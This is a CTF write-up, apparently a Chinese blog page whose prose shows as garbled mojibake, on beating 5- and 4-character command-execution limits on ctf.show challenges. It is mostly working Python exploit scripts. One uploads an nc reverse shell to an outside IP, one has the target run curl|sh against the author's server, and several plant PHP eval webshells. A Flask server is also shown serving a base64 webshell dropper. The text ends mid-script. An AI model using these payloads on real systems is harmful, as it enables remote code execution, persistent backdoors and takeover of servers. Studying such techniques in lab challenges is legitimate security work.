<p><img src="/img/summary/rce-5.png"></p>
<p>è‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:10</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show/&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getShell</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	file = &#123;<br>	<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">b&quot;#!/bin/sh\nnc 43.154.107.226 3389 -e /bin/sh&quot;</span><br>	&#125;<br>	requests.post(url,data=data,files=file)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	getShell(<span class="hljs-string">&quot;. /t*/*&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>


<h2 id="5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"></a>5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ</h2><h3 id="ç¯å¢ƒæœ‰dir"><a href="#ç¯å¢ƒæœ‰dir" class="headerlink" title="ç¯å¢ƒæœ‰dir"></a>ç¯å¢ƒæœ‰dir</h3><p>ä¸»è¦æ€è·¯ï¼š<br>1ï¼šå°†<code>index.php</code>è½¬ä¸º<code>.php</code><br>2ï¼šå°†ä¸´æ—¶æ–‡ä»¶æ‰“åŒ…åˆ°å½“å‰ç›®å½•<br>3ï¼šä½¿ç”¨phpæ‰§è¡Œtarå‹ç¼©åŒ…</p>
<p>ç¬¬ä¸€æ­¥çš„æ“ä½œä¸7å­—ç¬¦å¯å†™å·®ä¸å¤šï¼Œä¸»è¦æ˜¯ä¸ºäº†<code>index.php</code>è¿™ä¸ªæ–‡ä»¶åä¸å½±å“åé¢çš„æ’åº</p>
<p>å…ˆå¤åˆ¶ä¸€ä»½<code>index.php</code>çš„å†…å®¹</p>
<p><img src="/img/summary/rce-6.png"></p>
<p>ç„¶åé€šè¿‡<code>cp</code>ï¼Œ<code>rev</code>ï¼Œ<code>dir</code>ç­‰å‘½ä»¤å°†<code>index.php</code>è½¬åŒ–ä¸ºäº†<code>php.xedni</code></p>
<p><img src="/img/summary/rce-7.png"></p>
<p>å…ˆå°†å¤šä½™çš„æ–‡ä»¶åˆ é™¤ï¼Œå†åˆ©ç”¨shellä¸­çš„æ³¨é‡Šç¬¦<code>#</code>ï¼ŒæˆåŠŸå¾—åˆ°<code>.php</code>æ–‡ä»¶</p>
<p><img src="/img/summary/rce-8.png"></p>
<p>åˆ å»å¤šä½™çš„æ–‡ä»¶ï¼Œåˆ›å»º<code>tar</code>å‘½ä»¤å’Œ<code>vcf</code>å‚æ•°</p>
<p><img src="/img/summary/rce-9.png"></p>
<p>å¼ºåˆ¶ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°phpçš„æ–‡ä»¶ç¼“å­˜ç›®å½•<code>/tmp/xxxx</code>ï¼Œå†…å®¹æ˜¯<code>&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;);?&gt;</code></p>
<p>ç„¶åæœ€å…³é”®çš„å‘½ä»¤æ¥äº†ï¼Œä½¿ç”¨<code>* /t*</code>æ‰“åŒ…æ¶æ„æ–‡ä»¶åˆ°<code>z</code>ï¼Œå®é™…ä¸Šæ‰§è¡Œçš„æ˜¯<code>tar vcf z /tmp/*</code></p>
<p>æœ€åä½¿ç”¨<code>php z</code>å‘½ä»¤å†™å…¥shell</p>
<p><img src="/img/summary/rce-10.png"></p>
<p>è‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://78c1f836-ab24-4a5b-a22f-ce1494fe1b4c.challenge.ctf.show/&quot;</span><br>url_2 = url+<span class="hljs-string">&quot;.php&quot;</span><br>delay = <span class="hljs-number">1</span><br><br>chagneFile_payload=[<br><span class="hljs-string">&#x27;&gt;cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k&#x27;</span>,<br><span class="hljs-string">&#x27;*&#x27;</span>,<br><span class="hljs-string">&#x27;rm cp&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;pc&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;rm v&#x27;</span>,<br><span class="hljs-string">&#x27;rm k&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span>,<br><span class="hljs-string">&#x27;rm pc&#x27;</span>,<br><span class="hljs-string">&#x27;rm *v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php.&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vm&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;z&#x27;</span>,<br><span class="hljs-string">&#x27;sh z&#x27;</span><br>]<br><br>clearFile_payload=[<br><span class="hljs-string">&#x27;rm d*&#x27;</span>,<br><span class="hljs-string">&#x27;rm j*&#x27;</span>,<br><span class="hljs-string">&#x27;rm p*&#x27;</span>,<br><span class="hljs-string">&#x27;rm r*&#x27;</span>,<br><span class="hljs-string">&#x27;rm v*&#x27;</span>,<br><span class="hljs-string">&#x27;rm z&#x27;</span><br>]<br><br>shell_payload=[<br><span class="hljs-string">&#x27;&gt;tar&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vcf&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;z&#x27;</span><br>]<br><br>file=&#123;<br>	<span class="hljs-string">&#x27;file&#x27;</span>:<span class="hljs-string">b&#x27;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#x27;</span><br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">changeFile</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> chagneFile_payload:<br>		sendPayload(url,p)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clearFile</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> clearFile_payload:<br>		sendPayload(url_2,p)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(delay)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> shell_payload:<br>		sendPayload(url_2,p)<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(delay)<br>	data=&#123;<br>		<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;* /t*&quot;</span><br>	&#125;<br>	requests.post(url_2,data=data,files=file)<br>	data=&#123;<br>		<span class="hljs-string">&quot;cmd&quot;</span>:<span class="hljs-string">&quot;php z&quot;</span><br>	&#125;<br>	requests.post(url_2,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkShell</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sendPayload</span>(<span class="hljs-params">url,payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	changeFile()<br>	clearFile()<br>	getshell()<br>	checkShell()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>


<h3 id="ç¯å¢ƒæ— dir"><a href="#ç¯å¢ƒæ— dir" class="headerlink" title="ç¯å¢ƒæ— dir"></a>ç¯å¢ƒæ— dir</h3><p><code>dir</code>ä¸<code>ls</code>æœ€å¤§çš„åŒºåˆ«å°±æ˜¯<code>dir</code>æ²¡æœ‰æ¢è¡Œ</p>
<p>è¿™é¢˜ä¸»è¦æ€è·¯æ˜¯åˆ©ç”¨<code>grep</code>å‘½ä»¤ä¿®æ”¹é¢˜ç›®ï¼Œå¯ä»¥è¯´æ˜¯éå¸¸å·§å¦™äº†</p>
<p>å…·ä½“æ­¥éª¤å¦‚ä¸‹:</p>
<p>å†™å…¥<code>grep</code>å’Œ<code>h</code>ï¼Œæ¥ç€<code>*</code>æ‰§è¡Œï¼Œå®é™…ä¸Šå°±æ˜¯æ‹¿å‡ºé¢˜ç›®ä¸­åŒ…å«<code>h</code>çš„æ¯ä¸€è¡Œï¼Œæ°å¥½<code>if(strlen($cmd) &lt;= 5)</code>æ˜¯æ²¡æœ‰<code>h</code>çš„ï¼Œè¿™æ ·å°±æ²¡æœ‰é™åˆ¶äº†</p>
<p><img src="/img/summary/rce-11.png"></p>
<p>å°†ä¿®æ”¹åçš„ä»£ç è¿½åŠ åˆ°<code>i</code>ä¸­</p>
<p><img src="/img/summary/rce-12.png"></p>
<p><code>cp</code>åˆ°<code>index.php</code>ä¸­</p>
<p><img src="/img/summary/rce-13.png"></p>
<p>æ•´åˆè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:28</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://39fede4b-390d-42a1-b6c4-0924a2556b4e.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;grep&quot;</span>,<br><span class="hljs-string">&quot;&gt;h&quot;</span>,<br><span class="hljs-string">&quot;*&gt;j&quot;</span>,<br><span class="hljs-string">&quot;rm g*&quot;</span>,<br><span class="hljs-string">&quot;rm h*&quot;</span>,<br><span class="hljs-string">&quot;&gt;cat&quot;</span>,<br><span class="hljs-string">&quot;*&gt;&gt;i&quot;</span>,<br><span class="hljs-string">&quot;rm c*&quot;</span>,<br><span class="hljs-string">&quot;rm j&quot;</span>,<br><span class="hljs-string">&quot;&gt;cp&quot;</span>,<br><span class="hljs-string">&quot;*&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">0.3</span>)<br>	<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>


<h2 id="4å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#4å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="4å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"></a>4å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ</h2><h3 id="ç¯å¢ƒæœ‰dir-1"><a href="#ç¯å¢ƒæœ‰dir-1" class="headerlink" title="ç¯å¢ƒæœ‰dir"></a>ç¯å¢ƒæœ‰dir</h3><p>ä¸»è¦æ€è·¯å’Œ7å­—ç¬¦å¯å†™å·®ä¸å¤šï¼Œæ‹¼æ¥å‡º<code>ls -t</code>å‘½ä»¤åˆ°æŸä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨æŒ‰å€’åºå†™å…¥å†™é©¬çš„è¯­å¥ï¼Œä¾æ¬¡æ‰§è¡Œå³å¯ã€‚ä¸»è¦æ˜¯æ³¨æ„æ–‡ä»¶é¡ºåºé—®é¢˜</p>
<p>è‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:42</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://eb893c73-86c3-449f-98fe-0f82d9212110.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;sl&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;kt-&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\&gt;&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;j\\#&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dir&#x27;</span>,<br><span class="hljs-string">&#x27;*&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rev&#x27;</span>,<br><span class="hljs-string">&#x27;*v&gt;x&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><span class="hljs-string">&#x27;sh x&#x27;</span>,<br><span class="hljs-string">&#x27;sh j&#x27;</span><br>]<br><span class="hljs-comment">#&lt;?php eval($_GET[1]);?&gt;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">0.3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>

<h3 id="ç¯å¢ƒæ— dirï¼Œå¯å†™"><a href="#ç¯å¢ƒæ— dirï¼Œå¯å†™" class="headerlink" title="ç¯å¢ƒæ— dirï¼Œå¯å†™"></a>ç¯å¢ƒæ— dirï¼Œå¯å†™</h3><p>æ€è·¯æ˜¯é€šè¿‡<code>ls</code>ï¼Œ<code>mv</code>ï¼Œ<code>cat</code>æ„é€ å‡º<code>ls -t&gt;a</code>ï¼Œå†<code>curl</code>å†™ä¸€å¥è¯</p>
<p>å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š</p>
<p>å…ˆå°†<code>ls -t&gt;a</code>å†™å…¥<code>z</code></p>
<p><img src="/img/summary/rce-14.png"></p>
<p>å€’åºå†™å…¥<code>curl 335708495|sh</code>ï¼Œæ³¨æ„æœåŠ¡å™¨çš„ipè¦å…ˆè½¬int</p>
<p><img src="/img/summary/rce-15.png"></p>
<p>æœåŠ¡å™¨ä¸Šç”¨<code>flask</code>å†™ä¸ª<code>shell</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p>å…ˆæ‰§è¡Œ<code>sh z</code>ï¼Œå³æ‰§è¡Œäº†<code>ls -t&gt;a</code>ï¼Œå³å‘<code>a</code>å†™å…¥<code>curl 335708495|sh</code>ï¼Œå†<code>sh a</code>ï¼Œå°±æ‰§è¡Œäº†<code>curl 335708495|sh</code>ï¼Œå¹¶è¿”å›<code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code>ï¼ŒæˆåŠŸå†™å…¥<code>1.php</code></p>
<p>è‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:58</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://5d1769eb-d4a2-4077-bed9-7eb90cbdf2f9.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-comment">#curl 335708495|sh</span><br><span class="hljs-string">&#x27;&gt;sh&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;5\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;49\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;08\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;57\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;33\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span>,<br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>	data=&#123;<br>	<span class="hljs-string">&quot;cmd&quot;</span>:payload<br>	&#125;<br>	requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>	<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>		writeFile(p.strip())<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>		time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>	response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>	<span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>	run()<br>	check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	main()<br></code></pre></td></tr></table></figure>

<h3 id="ç¯å¢ƒæ— dirï¼Œå¯å†™ä½†ä¸å‡ºç½‘"><a href="#ç¯å¢ƒæ— dirï¼Œå¯å†™ä½†ä¸å‡ºç½‘" class="headerlink" title="ç¯å¢ƒæ— dirï¼Œå¯å†™ä½†ä¸å‡ºç½‘"></a>ç¯å¢ƒæ— dirï¼Œå¯å†™ä½†ä¸å‡ºç½‘</h3><p>å› ä¸º<code>ls -t</code>å‘½ä»¤å¯¹æ–‡ä»¶è¿›è¡Œæ’åºæ—¶åªèƒ½æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸€ä¸ªé‡å®šå‘ç¬¦å·ï¼Œä¸€ä¸ªç®¡é“ç¬¦ï¼Œå¤šäº†æ’åºå°±ä¹±äº†ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥ç”¨<code>echo xxx|base64 -d&gt;a.php</code>çš„æ–¹å¼äº†ï¼Œä¸”è€ƒè™‘åˆ°ä¸‡ä¸€ä¸´æ—¶æ–‡ä»¶è¿‡å¤šçš„æƒ…å†µï¼Œä¹Ÿä¸é‡‡ç”¨5å­—ç¬¦çš„ä¸Šä¼ ä¸´æ—¶æ–‡ä»¶çš„æ–¹æ³•ã€‚è§£å†³æ–¹æ¡ˆæ˜¯ç”¨<code>$&#123;IFS&#125;</code>ä»£æ›¿ç©ºæ ¼ï¼Œå˜æˆ<code>echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php</code></p>
<p>æ­¥éª¤ä¸<code>4å­—ç¬¦-ç¯å¢ƒæ— dirï¼Œå¯å†™</code>åŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯æ›¿æ¢äº†<code>curlå‘½ä»¤</code>ï¼Œå˜æˆäº†<code>echo ...</code></p>
<p>è‡ªåŠ¨åŒ–è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:56:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span 